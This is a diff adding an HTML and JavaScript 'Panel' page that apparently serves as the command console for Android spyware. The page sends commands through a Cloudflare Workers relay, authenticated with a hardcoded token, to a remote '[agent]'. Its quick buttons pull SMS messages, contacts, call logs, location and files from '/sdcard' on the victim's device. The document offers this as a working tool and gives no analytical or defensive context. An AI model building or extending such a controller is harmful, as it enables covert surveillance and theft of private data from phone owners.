@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Panel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: -apple-system, sans-serif; background: #0e0e0e; color: #eee;
+           margin: 0; padding: 12px; font-size: 14px; }
+    h1 { font-size: 16px; margin: 0 0 8px; }
+    #status { font-size: 11px; color: #888; margin-bottom: 8px; }
+    #output { white-space: pre-wrap; background: #1a1a1a; padding: 12px;
+              border-radius: 8px; height: 60vh; overflow-y: auto;
+              font-family: monospace; font-size: 12px; }
+    .bar { display: flex; gap: 6px; margin-top: 8px; }
+    input { flex: 1; padding: 10px; font-size: 14px; border-radius: 6px;
+            border: none; background: #222; color: #eee; }
+    button { padding: 10px 16px; border-radius: 6px; border: none;
+             background: #0a84ff; color: #fff; font-weight: bold; }
+    .quick { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
+    .quick button { font-size: 11px; padding: 6px 10px; background: #333; }
+  </style>
+</head>
+<body>
+  <h1>Panel</h1>
+  <div id="status">connecting...</div>
+  <div id="output"></div>
+
+  <div class="bar">
+    <input id="cmd" placeholder="command..." autocomplete="off">
+    <button onclick="sendCmd()">send</button>
+  </div>
+
+  <div class="quick">
+    <button onclick="quick('/ping')">ping</button>
+    <button onclick="quick('/info')">info</button>
+    <button onclick="quick('/sms')">sms</button>
+    <button onclick="quick('/contacts')">contacts</button>
+    <button onclick="quick('/calllog')">calllog</button>
+    <button onclick="quick('/loc')">loc</button>
+    <button onclick="quick('/file /sdcard')">/sdcard</button>
+  </div>
+
+  <script>
+    const WORKER = "https://panel-bridge.kanjutharep.workers.dev";
+    const AUTH = "eeae47917d28ded7db9a7ecaeccfbf0b603ef6014aeb6457d2280efdfa3c45f5";
+    let offset = 0;
+    let lastAuth = Date.now();
+
+    function log(t) {
+      const o = document.getElementById("output");
+      o.textContent += t + "\n";
+      o.scrollTop = o.scrollHeight;
+    }
+
+    async function poll() {
+      try {
+        const r = await fetch(`${WORKER}/messages?offset=${offset}`, {
+          headers: { "X-Auth": AUTH }
+        });
+        if (r.status === 401) {
+          document.getElementById("status").textContent = "unauthorized — cek PANEL_KEY";
+          setTimeout(poll, 5000);
+          return;
+        }
+        const j = await r.json();
+        if (j.ok && j.result) {
+          for (const u of j.result) {
+            offset = u.update_id + 1;
+            if (u.message && u.message.text) log("[agent] " + u.message.text);
+          }
+        }
+        document.getElementById("status").textContent =
+          "connected — " + new Date().toLocaleTimeString();
+      } catch (e) {
+        document.getElementById("status").textContent = "err: " + e.message;
+      }
+      setTimeout(poll, 2000);
+    }
+
+    async function sendCmd() {
+      const el = document.getElementById("cmd");
+      const text = el.value.trim();
+      if (!text) return;
+      el.value = "";
+      log("[me] " + text);
+      try {
+        await fetch(`${WORKER}/send`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "X-Auth": AUTH },
+          body: JSON.stringify({ text })
+        });
+      } catch (e) { log("[err] " + e.message); }
+    }
+
+    function quick(c) {
+      document.getElementById("cmd").value = c;
+      sendCmd();
+    }
+
+    document.getElementById("cmd").addEventListener("keydown", (e) => {
+      if (e.key === "Enter") sendCmd();
+    });
+
+    poll();
+  </script>
+</body>
+</html>
